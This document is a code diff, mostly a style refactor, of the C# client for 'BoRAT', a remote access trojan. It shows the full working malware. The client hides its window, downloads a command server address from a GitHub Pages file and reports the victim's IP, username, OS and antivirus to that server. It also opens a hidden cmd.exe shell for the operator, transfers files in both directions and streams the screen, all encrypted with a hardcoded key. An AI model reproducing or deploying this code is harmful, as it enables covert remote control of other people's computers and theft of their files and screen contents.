@@ -1,45 +1,43 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
+using System.Diagnostics;
 using System.Drawing;
-using System.Text;
-using System.Windows.Forms;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Management;
 using System.Net;
 using System.Net.Sockets;
-using System.Threading;
-using Microsoft.Win32;
-using System.Management;
-using System.Diagnostics;
-using System.IO;
+using System.Security;
 using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace BoRAT.Client
 {
     public partial class frmMain : Form
     {
-        private string serverList = "https://borat-admin.github.io/site/serverList.txt";
-
         private IPAddress _ip;
         private int _port, _delay;
 
-        Socket clientSocket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+        private Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-        //Cmd Shell
-        bool isStarted;
-        StreamWriter writeInput;
-        StreamReader readOuput, errorOutput;
 
         //FileManager
-        int fupSize = 0;
-        int writeSize = 0;
-        string fdl_location = "";
-        string fup_location = "";
-        bool isFileUpload { get; set; }
-        byte[] receivedFile = new byte[1];
+        private int fupSize;
+        private string fdl_location = "";
+        private string fup_location = "";
+        private byte[] receivedFile = new byte[1];
+        private int writeSize;
 
-        //Rdp
-        bool isRdpStop { get; set; }
+        private bool isFileUpload { get; set; }
+
+        //Cmd Shell
+        private bool isStarted;
+        private StreamReader readOuput, errorOutput;
+
+        private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
+        private StreamWriter writeInput;
 
         public frmMain()
         {
@@ -47,15 +45,18 @@ namespace BoRAT.Client
             GetConnectionIPs();
         }
 
+        //Rdp
+        private bool isRdpStop { get; set; }
+
         private void GetConnectionIPs()
         {
             try
             {
-                using (WebClient client = new WebClient())
+                using (var client = new WebClient())
                 {
-                    string s = client.DownloadString(serverList);
+                    var s = client.DownloadString(serverList);
 
-                    string[] list = s.Split(':');
+                    var list = s.Split(':');
 
                     _ip = IPAddress.Parse(list[0]);
                     _port = Convert.ToInt32(list[1]);
@@ -72,14 +73,13 @@ namespace BoRAT.Client
 
         private void FrmMain_Shown(object sender, EventArgs e)
         {
-            Thread coreThread = new Thread(new ThreadStart(StartConnection));
+            var coreThread = new Thread(StartConnection);
             coreThread.Start();
         }
 
         private void StartConnection()
         {
-            while(true)
-            {
+            while (true)
                 if (clientSocket.Connected)
                 {
                     Console.WriteLine("Connected to " + _ip + " on port " + _port);
@@ -89,13 +89,12 @@ namespace BoRAT.Client
                 {
                     MakeConnection();
                 }
-            }
         }
 
         private void ReceiveInfo()
         {
-            byte[] buffer = new byte[1024];
-            int received = 0;
+            var buffer = new byte[1024];
+            var received = 0;
 
             try
             {
@@ -111,21 +110,18 @@ namespace BoRAT.Client
             if (received == 0)
                 return;
 
-            byte[] data = new byte[received];
+            var data = new byte[received];
             Array.Copy(buffer, data, received);
 
-            if (isFileUpload)
-            {
-                ProcessUploadRequest(data);
-            }
+            if (isFileUpload) ProcessUploadRequest(data);
 
-            if(!isFileUpload)
+            if (!isFileUpload)
                 ProcessNormalRequest(data);
         }
 
         private void MakeConnection()
         {
-            while(!clientSocket.Connected)
+            while (!clientSocket.Connected)
             {
                 try
                 {
@@ -137,38 +133,39 @@ namespace BoRAT.Client
                 {
                     // Run just in case IPs change
                     GetConnectionIPs();
-                };
+                }
+
+                ;
             }
         }
 
         private string GetPublicIPAddress()
         {
-            string pubIP = new WebClient().DownloadString("https://api.ipify.org");
+            var pubIP = new WebClient().DownloadString("https://api.ipify.org");
             return pubIP;
         }
 
         private string GetUserName()
         {
-            string machinName = Environment.UserName;
+            var machinName = Environment.UserName;
             return machinName;
-
         }
 
         private string GetOSName()
         {
             string osName;
-            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
+            var key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
             osName = (string)key.GetValue("productName");
             return osName;
         }
 
         private string GetSecurityName()
         {
-            string avName = "";
+            var avName = "";
             try
             {
-                bool windowsDefender = false;
-                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
+                var windowsDefender = false;
+                var wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                 var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                 var instances = searcher.Get();
                 avName = "";
@@ -177,11 +174,9 @@ namespace BoRAT.Client
                     if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
                         windowsDefender = true;
                     if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
-                    {
                         avName = instance.GetPropertyValue("displayName").ToString();
-                    }
-
                 }
+
                 if (avName.Equals(string.Empty) && windowsDefender)
                     avName = "Windows Defender";
                 if (avName == "") avName = "N/A";
@@ -190,22 +185,23 @@ namespace BoRAT.Client
             {
                 avName = "N/A";
             }
+
             return avName;
         }
 
         private string GetTimeDate()
         {
-            string TimeDate = DateTime.Now.ToString();
+            var TimeDate = DateTime.Now.ToString();
             return TimeDate;
         }
 
         private void ProcessNormalRequest(byte[] data)
         {
-            string cmd = Encoding.Unicode.GetString(data);
+            var cmd = Encoding.Unicode.GetString(data);
             cmd = Decrypt(cmd);
             if (cmd.Contains("getInfo"))
             {
-                string id = cmd.Split('~')[1];
+                var id = cmd.Split('~')[1];
                 string information, pubIp, userName, osName, avName, timeDate;
                 pubIp = GetPublicIPAddress();
                 userName = GetUserName();
@@ -214,9 +210,9 @@ namespace BoRAT.Client
                 timeDate = GetTimeDate();
 
                 information = id + "~" + pubIp + "~" + userName +
-                               "~" + osName + "~" + avName + "~" +
-                               timeDate;
-                string sendInfo = "infoBack|" + information;
+                              "~" + osName + "~" + avName + "~" +
+                              timeDate;
+                var sendInfo = "infoBack|" + information;
 
                 SendCommand(sendInfo);
             }
@@ -225,7 +221,7 @@ namespace BoRAT.Client
             {
                 isStarted = true;
 
-                ProcessStartInfo pInfo = new ProcessStartInfo();
+                var pInfo = new ProcessStartInfo();
                 pInfo.FileName = "cmd.exe";
                 pInfo.CreateNoWindow = true;
                 pInfo.UseShellExecute = false;
@@ -233,7 +229,7 @@ namespace BoRAT.Client
                 pInfo.RedirectStandardOutput = true;
                 pInfo.RedirectStandardError = true;
 
-                Process p = new Process();
+                var p = new Process();
                 p.StartInfo = pInfo;
                 p.Start();
                 writeInput = p.StandardInput;
@@ -241,7 +237,7 @@ namespace BoRAT.Client
                 errorOutput = p.StandardError;
                 writeInput.AutoFlush = true;
 
-                Thread cmdShellThread = new Thread(new ThreadStart(RunCmdShellCommands));
+                var cmdShellThread = new Thread(RunCmdShellCommands);
                 cmdShellThread.Start();
             }
 
@@ -249,7 +245,7 @@ namespace BoRAT.Client
             {
                 if (isStarted)
                 {
-                    string strCmd = cmd.Split('§')[1];
+                    var strCmd = cmd.Split('§')[1];
                     writeInput.WriteLine(strCmd + "\r\n");
                 }
 
@@ -261,11 +257,10 @@ namespace BoRAT.Client
 
             else if (cmd.Equals("drivesList"))
             {
-                string dataToSend = "drivesList~";
-                DriveInfo[] drivers = DriveInfo.GetDrives();
+                var dataToSend = "drivesList~";
+                var drivers = DriveInfo.GetDrives();
 
-                foreach (DriveInfo d in drivers)
-                {
+                foreach (var d in drivers)
                     try
                     {
                         if (d.IsReady)
@@ -283,34 +278,36 @@ namespace BoRAT.Client
                     {
                         SendError("FileManager Error!\n" + ex.Message);
                     }
-                }
 
                 SendCommand(dataToSend);
             }
 
             else if (cmd.StartsWith("enterPath~"))
             {
-                bool checkPath = false;
-                string path = cmd.Split('~')[1];
+                var checkPath = false;
+                var path = cmd.Split('~')[1];
 
                 if (path.Length == 3 && path.Contains(":\\"))
+                {
                     checkPath = true;
+                }
                 else if (!checkPath && Directory.Exists(path))
+                {
                     checkPath = true;
+                }
                 else
                 {
                     SendError("Directory Not Found\n");
                     return;
                 }
 
-                Thread enterDir = new Thread(() => FM_EnterDirectory(path));
+                var enterDir = new Thread(() => FM_EnterDirectory(path));
                 enterDir.Start();
-
             }
 
             else if (cmd.StartsWith("backPath~"))
             {
-                string path = cmd.Split('~')[1];
+                var path = cmd.Split('~')[1];
 
                 if (path.Length == 3 && path.Contains(":\\"))
                 {
@@ -321,25 +318,23 @@ namespace BoRAT.Client
                     path = new DirectoryInfo(path).Parent.FullName;
                     SendCommand("backPath~" + path);
                 }
-
             }
 
             else if (cmd.StartsWith("fdl~"))
             {
-                string info = cmd.Split('~')[1];
+                var info = cmd.Split('~')[1];
                 if (File.Exists(info))
                 {
                     fdl_location = info;
                     try
                     {
-                        string size = new FileInfo(info).Length.ToString();
+                        var size = new FileInfo(info).Length.ToString();
                         SendCommand("fInfo~" + size);
                     }
                     catch (Exception ex)
                     {
                         SendError("Access Error!.\n" + ex.Message + "\n");
                     }
-
                 }
                 else
                 {
@@ -351,7 +346,7 @@ namespace BoRAT.Client
             {
                 try
                 {
-                    byte[] dataToSend = File.ReadAllBytes(fdl_location);
+                    var dataToSend = File.ReadAllBytes(fdl_location);
                     SendFile(dataToSend);
                 }
                 catch (Exception ex)
@@ -379,12 +374,14 @@ namespace BoRAT.Client
             else if (cmd.Equals("rdpStart"))
             {
                 isRdpStop = false;
-                Thread rdpThread = new Thread(new ThreadStart(StreamScreen));
+                var rdpThread = new Thread(StreamScreen);
                 rdpThread.Start();
             }
 
             else if (cmd.Equals("rdpStop"))
+            {
                 isRdpStop = true;
+            }
         }
 
         private void ProcessUploadRequest(byte[] data)
@@ -393,22 +390,23 @@ namespace BoRAT.Client
 
             writeSize += data.Length;
 
-            if(receivedFile.Length==fupSize)
+            if (receivedFile.Length == fupSize)
             {
                 try
                 {
-                    using (FileStream fs = File.Create(fup_location))
+                    using (var fs = File.Create(fup_location))
                     {
-                        byte[] info = receivedFile;
+                        var info = receivedFile;
                         fs.Write(info, 0, info.Length);
                     }
 
                     Array.Clear(receivedFile, 0, receivedFile.Length);
                 }
-                catch(Exception ex)
+                catch (Exception ex)
                 {
                     SendError("File Upload Error!\n" + ex.Message + "\n");
                 }
+
                 SendCommand("fileReceived");
                 isFileUpload = false;
             }
@@ -418,11 +416,11 @@ namespace BoRAT.Client
         {
             try
             {
-                string encrypt = Encrypt(data);
-                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
+                var encrypt = Encrypt(data);
+                var dataToSend = Encoding.Unicode.GetBytes(encrypt);
                 clientSocket.Send(dataToSend);
             }
-            catch(Exception)
+            catch (Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 MakeConnection();
@@ -435,7 +433,7 @@ namespace BoRAT.Client
             {
                 clientSocket.Send(data);
             }
-            catch(Exception)
+            catch (Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 MakeConnection();
@@ -446,12 +444,12 @@ namespace BoRAT.Client
         {
             try
             {
-                byte[] dataToSend = new byte[data.Length + 16];
-                byte[] header = Encoding.Unicode.GetBytes("rdpImage");
+                var dataToSend = new byte[data.Length + 16];
+                var header = Encoding.Unicode.GetBytes("rdpImage");
                 Buffer.BlockCopy(header, 0, dataToSend, 0, header.Length);
                 Buffer.BlockCopy(data, 0, dataToSend, header.Length, data.Length);
 
-                clientSocket.Send(dataToSend,0,dataToSend.Length,SocketFlags.None);
+                clientSocket.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
             }
             catch (Exception)
             {
@@ -459,27 +457,31 @@ namespace BoRAT.Client
                 MakeConnection();
             }
         }
+
         private void SendError(string data)
         {
             try
             {
-                string error = "error~" + data;
-                string encrypt = Encrypt(error);
-                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
+                var error = "error~" + data;
+                var encrypt = Encrypt(error);
+                var dataToSend = Encoding.Unicode.GetBytes(encrypt);
                 clientSocket.Send(dataToSend);
             }
-            catch(Exception)
+            catch (Exception)
             {
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 MakeConnection();
             }
         }
+
         private void RunCmdShellCommands()
         {
             try
             {
-                String tmpData = "", tmpError = "",
-                    strData = "", strError = "";
+                string tmpData = "",
+                    tmpError = "",
+                    strData = "",
+                    strError = "";
 
                 while ((tmpData = readOuput.ReadLine()) != null)
                 {
@@ -507,56 +509,55 @@ namespace BoRAT.Client
         {
             try
             {
-                string[] directories = Directory.GetDirectories(path);
-                string[] files = Directory.GetFiles(path);
+                var directories = Directory.GetDirectories(path);
+                var files = Directory.GetFiles(path);
 
-                string dir = "";
-                string file = "";
+                var dir = "";
+                var file = "";
 
-                foreach (string d in directories)
+                foreach (var d in directories)
                 {
-
-                    string size = "N/A";
-                    string name = d.Replace(path, "");
-                    string creationTime = Directory.GetCreationTime(path).ToString();
-                    string info = name + "|" + size + "|" + creationTime + "|" + d;
+                    var size = "N/A";
+                    var name = d.Replace(path, "");
+                    var creationTime = Directory.GetCreationTime(path).ToString();
+                    var info = name + "|" + size + "|" + creationTime + "|" + d;
                     dir += info + "\n";
                 }
 
-                foreach (string f in files)
+                foreach (var f in files)
                 {
-                    string size = new FileInfo(f).Length.ToString();
-                    string name = Path.GetFileName(f);
-                    string creationTime = File.GetCreationTime(f).ToString();
-                    string info = name + "|" + size.ToString() + "|" + creationTime + "|" + f;
+                    var size = new FileInfo(f).Length.ToString();
+                    var name = Path.GetFileName(f);
+                    var creationTime = File.GetCreationTime(f).ToString();
+                    var info = name + "|" + size + "|" + creationTime + "|" + f;
                     file += info + "\n";
                 }
 
-                string dataToSend = "enterPath~" + dir + file;
+                var dataToSend = "enterPath~" + dir + file;
 
                 SendCommand(dataToSend);
             }
-            catch(ArgumentNullException)
+            catch (ArgumentNullException)
             {
                 SendError("Error in EnterPath\n");
             }
-            catch(System.Security.SecurityException)
+            catch (SecurityException)
             {
                 SendError("Security Error in EnterPath\n");
             }
-            catch(ArgumentException)
+            catch (ArgumentException)
             {
                 SendError("Error in EnterPath\n");
             }
-            catch(UnauthorizedAccessException)
+            catch (UnauthorizedAccessException)
             {
                 SendError("Unauthorized Error in EnterPath\n");
             }
-            catch(PathTooLongException)
+            catch (PathTooLongException)
             {
                 SendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
             }
-            catch(NotSupportedException)
+            catch (NotSupportedException)
             {
                 SendError("Unkown Error in EnterPath\n");
             }
@@ -564,10 +565,10 @@ namespace BoRAT.Client
 
         private void StreamScreen()
         {
-            while(!isRdpStop)
+            while (!isRdpStop)
             {
-                ImageConverter imgConverter = new ImageConverter();
-                byte[] image = (byte[]) imgConverter.ConvertTo(DesktopScreen(),typeof(byte[]));
+                var imgConverter = new ImageConverter();
+                var image = (byte[])imgConverter.ConvertTo(DesktopScreen(), typeof(byte[]));
                 SendImage(image);
                 Thread.Sleep(1000);
             }
@@ -575,17 +576,17 @@ namespace BoRAT.Client
 
         private void FrmMain_Load(object sender, EventArgs e)
         {
-            this.Hide();
+            Hide();
         }
 
         private Bitmap DesktopScreen()
         {
             try
             {
-                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
-                System.Drawing.Bitmap screenshot = new System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
-                System.Drawing.Graphics graph = System.Drawing.Graphics.FromImage(screenshot);
-                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, System.Drawing.CopyPixelOperation.SourceCopy);
+                var bounds = Screen.PrimaryScreen.Bounds;
+                var screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+                var graph = Graphics.FromImage(screenshot);
+                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                 return screenshot;
             }
             catch (Exception)
@@ -593,27 +594,30 @@ namespace BoRAT.Client
                 return null;
             }
         }
-        
+
         public string Encrypt(string clearText)
         {
-            string EncryptionKey = "BoRAT_2022";
-            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
-            using (Rijndael encryptor = Rijndael.Create())
+            var EncryptionKey = "BoRAT_2022";
+            var clearBytes = Encoding.Unicode.GetBytes(clearText);
+            using (var encryptor = Rijndael.Create())
             {
-                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
+                var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                    new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                 encryptor.Key = pdb.GetBytes(32);
                 encryptor.IV = pdb.GetBytes(16);
 
-                using (MemoryStream ms = new MemoryStream())
+                using (var ms = new MemoryStream())
                 {
-                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
+                    using (var cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                     {
                         cs.Write(clearBytes, 0, clearBytes.Length);
                         cs.Close();
                     }
+
                     clearText = Convert.ToBase64String(ms.ToArray());
                 }
             }
+
             return clearText;
         }
 
@@ -621,23 +625,26 @@ namespace BoRAT.Client
         {
             try
             {
-                string EncryptionKey = "BoRAT_2022";
-                byte[] cipherBytes = Convert.FromBase64String(cipherText);
-                using (Rijndael encryptor = Rijndael.Create())
+                var EncryptionKey = "BoRAT_2022";
+                var cipherBytes = Convert.FromBase64String(cipherText);
+                using (var encryptor = Rijndael.Create())
                 {
-                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
+                    var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                        new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
-                    using (MemoryStream ms = new MemoryStream())
+                    using (var ms = new MemoryStream())
                     {
-                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                        using (var cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                         {
                             cs.Write(cipherBytes, 0, cipherBytes.Length);
                             cs.Close();
                         }
+
                         cipherText = Encoding.Unicode.GetString(ms.ToArray());
                     }
                 }
+
                 return cipherText;
             }
             catch (Exception)
